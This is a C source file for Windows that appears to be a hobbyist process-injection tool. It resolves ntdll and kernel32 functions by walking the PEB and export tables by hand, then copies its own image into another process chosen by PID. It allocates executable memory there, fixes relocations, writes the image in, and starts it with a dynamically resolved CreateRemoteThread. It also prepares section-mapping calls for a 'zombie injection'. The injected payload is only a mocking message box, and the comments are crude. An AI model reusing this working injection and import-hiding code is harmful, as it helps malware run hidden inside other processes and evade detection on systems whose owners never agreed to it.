#include <Windows.h>
#include "NtDefs.h"
#include <Shlwapi.h>
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Shlwapi.lib")

typedef (__stdcall *nt_RtlCopyMemory)(
	_Out_       VOID UNALIGNED *Destination,
	_In_  const VOID UNALIGNED *Source,
	_In_        SIZE_T         Length
	);
nt_RtlCopyMemory NtRtlCopyMemory;
BOOL resolvent() {

	// resolve NT functions
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0)
	{
		return FALSE;
	}
	NtRtlCopyMemory = (nt_RtlCopyMemory)GetProcAddress(ntdll, "RtlMoveMemory");
	if (!NtRtlCopyMemory) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}
DWORD GetModuleSize(HMODULE hModule)
{
	if (hModule)
	{
		PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)hModule;
		PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(pDOS->e_lfanew + (DWORD)hModule);
		if (pNT->Signature == IMAGE_NT_SIGNATURE && pDOS->e_magic == IMAGE_DOS_SIGNATURE)
		{
			return pNT->OptionalHeader.SizeOfImage;
		}
	}
	return 0;
}



PPEB32 GetPEB()
{
	_asm MOV EAX, DWORD PTR FS : [30h]
}


void * GetProcAddress32(void * lvpBaseAddress, char * lpszProcName)
{

	if (lvpBaseAddress)
	{
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)((DWORD)lvpBaseAddress);
		PIMAGE_NT_HEADERS psNtHeader = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + (DWORD)lvpBaseAddress);

		char * lpcModBase = (char *)lvpBaseAddress;
		PIMAGE_EXPORT_DIRECTORY psExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpcModBase +
			psNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		int nNumberOfNames = psExportDir->NumberOfNames;
		unsigned long * lpulFunctions =
			(unsigned long *)(lpcModBase + psExportDir->AddressOfFunctions);

		unsigned long * lpulNames =
			(unsigned long *)(lpcModBase + psExportDir->AddressOfNames);

		unsigned short * lpusOrdinals =
			(unsigned short *)(lpcModBase + psExportDir->AddressOfNameOrdinals);



		int i;
		char * lpszFunctionName;




		for (i = 0; i < nNumberOfNames; i++) {
			lpszFunctionName = ((__int8 *)lpulNames[i]) + (int)lvpBaseAddress;



			if (StrCmpNIA(lpszFunctionName, lpszProcName, strlen(lpszProcName)) == 0)
			{

				DWORD Offset = lpulFunctions[lpusOrdinals[i]];
				void* FunctionAddress = (void*)(Offset + (DWORD)lvpBaseAddress);

				if (Offset >= psNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
					&& Offset < (psNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + psNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size))
				{

					DWORD ulName = strlen((char*)((DWORD)lvpBaseAddress + Offset)) + 1;
					char *forward_lib = (char*)VirtualAlloc(NULL, ulName, MEM_COMMIT | MEM_RESERVE, 0x40);

					if (forward_lib)
					{
						char* forward_name = forward_lib;
						RtlSecureZeroMemory(forward_lib, ulName);
						NtRtlCopyMemory(forward_lib, (char*)((DWORD)lvpBaseAddress + Offset), ulName - 1);

						while (*++forward_name != '.');

						*forward_name++ = 0;

						lvpBaseAddress = LoadLibraryA(forward_lib);
						if (lvpBaseAddress)
						{
							FunctionAddress = GetProcAddress32(lvpBaseAddress, forward_name);
						}
						else
							FunctionAddress = NULL;
						VirtualFree(forward_lib, 0, MEM_RELEASE);
					}
				}

				return FunctionAddress;
			}
		}
	}
	return NULL;
}


void* GetModuleBase32(wchar_t* szModule)
{
	PPEB32 Peb = GetPEB();
	PPEB_LDR_DATA Ldr = Peb->Ldr;
	PLDR_DATA_TABLE_ENTRY DataEntryStart = (PLDR_DATA_TABLE_ENTRY)Ldr->InLoadOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY DataCurrent = DataEntryStart;

	if (szModule == NULL)
		return DataCurrent->DllBase;
	do
	{
		if (!StrCmpNIW(DataCurrent->BaseDllName.Buffer, szModule, DataCurrent->BaseDllName.Length))
		{
			return DataCurrent->DllBase;
		}

		DataCurrent = (PLDR_DATA_TABLE_ENTRY)DataCurrent->InLoadOrderLinks.Flink;
	} while (DataEntryStart != DataCurrent && DataCurrent && DataCurrent->BaseDllName.Buffer);


	return NULL;
}
int FromBase64Crypto(const BYTE* pSrc, int nLenSrc, wchar_t* pDst, int nLenDst)
{
	DWORD nLenOut = nLenDst;
	BOOL fRet = CryptStringToBinaryW((LPCWSTR)pSrc, nLenSrc, CRYPT_STRING_BASE64, (BYTE*)pDst, &nLenOut, NULL, NULL);
	if (!fRet) nLenOut = 0;
	return(nLenOut);
}

VOID ProcessRelocations(PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD Size)
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;
	PIMAGE_FIXUP_ENTRY Fixup = 0;
	DWORD i = 0;
	while ((DWORD)Reloc - (DWORD)Relocs < Size)
	{
		if (!Reloc->SizeOfBlock)
		{
			break;
		}
		Fixup = (PIMAGE_FIXUP_ENTRY)((DWORD)Reloc + sizeof(IMAGE_BASE_RELOCATION));
		for (i = 0; i < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; i++, Fixup++)
		{
			DWORD dwPointerRVA = ((DWORD)Reloc->VirtualAddress + Fixup->Offset);

			if (Fixup->Offset != 0)
			{
				*(DWORD*)(ImageBase + dwPointerRVA) += Delta;
			}
		}
		Reloc = (PIMAGE_BASE_RELOCATION)((DWORD)Reloc + Reloc->SizeOfBlock);
	}
}

// i dont see why you would do this imo... theres like 10 times ways to do this....
__declspec(naked) void GetImageBase()
{
	__asm
	{
		mov EAX, GetImageBase
		and eax, 0xFFFF0000
		find:
		cmp word ptr[eax], 0x5A4D
			je end
			sub eax, 0x00010000
			JMP find
			end :
		ret

	}
}

DWORD Inject(LPTHREAD_START_ROUTINE Function, HANDLE proc)
{
	DWORD Base = 0;

	HMODULE hModule = ((HMODULE(*)())GetImageBase)();
	PIMAGE_DOS_HEADER DOS = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)((DWORD)hModule + DOS->e_lfanew);

	DWORD ulSize = NT->OptionalHeader.SizeOfImage;


	LPVOID lpNewAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulSize);
	if (lpNewAddr)

	{

		NtRtlCopyMemory(lpNewAddr, hModule, ulSize);
		if ((Base = (DWORD)VirtualAllocEx(proc, NULL, ulSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
		{

			DWORD RelRVA = NT->OptionalHeader.DataDirectory[5].VirtualAddress;
			DWORD RelSize = NT->OptionalHeader.DataDirectory[5].Size;
			ProcessRelocations((PIMAGE_BASE_RELOCATION)((DWORD)hModule + RelRVA), (DWORD)lpNewAddr, (DWORD)Base - (DWORD)hModule, RelSize);


			if (WriteProcessMemory(proc, (LPVOID)Base, lpNewAddr, ulSize, 0))
			{
				Base += (DWORD)Function - (DWORD)hModule;
			}
		}

		HeapFree(GetProcessHeap(), 0, lpNewAddr);
	}

	return Base;
}
// yes i know NtCreateSection is common for PE Injection types...
NtCreateSection_ NtCreateSection;
NtMapViewOfSection_ NtMapViewOfSection;
NtUnmapViewOfSection_ NtUnmapViewOfSection;
NtClose_ NtClose;

BOOL InitializeZombieInjection()
{
	void* hModule = GetModuleBase32(L"ntdll.dll");

	NtCreateSection = (NtCreateSection_)GetProcAddress32(hModule, "NtCreateSection");
	if (!NtCreateSection)
	{
		return 0;
	}

	NtMapViewOfSection = (NtMapViewOfSection_)GetProcAddress32(hModule, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
	{
		return 0;
	}

	NtUnmapViewOfSection = (NtUnmapViewOfSection_)GetProcAddress32(hModule, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection)
	{
		return 0;
	}

	NtClose = (NtClose_)GetProcAddress32(hModule, "NtClose");
	if (!NtClose)
	{
		return 0;
	}

	return 1;
}



int RemoteMain()
{
	MessageBoxA(NULL, "MalwareTech's hacks are stolen hacks.", "Lock him up ;)", MB_ICONINFORMATION);
	return 0;
}
void main() {

	if(!resolvent()){
  // i dont know something is fucked up here...
  	MessageBoxA(NULL, "Something is fucked up... you sure ntdll exits lmaoo...", "LoL", MB_ICONERROR);

  }
  //2328 is PID of some process... change that...
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2328);
	if (hProc)
	{
		DWORD dwBase = Inject((LPTHREAD_START_ROUTINE)RemoteMain, hProc);
		((HANDLE(_stdcall*)(HANDLE, LPVOID, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress32(GetModuleBase32(L"kernel32.dll"),"CreateRemoteThread"))(hProc,0,0,(LPTHREAD_START_ROUTINE)dwBase,0,0,0);
		CloseHandle(hProc);
	}
	else {
	MessageBoxA(NULL, "VOIDPTR!, shit fucked up...", "Lock him up ;)", MB_ICONEXCLAMATION);

	}
}
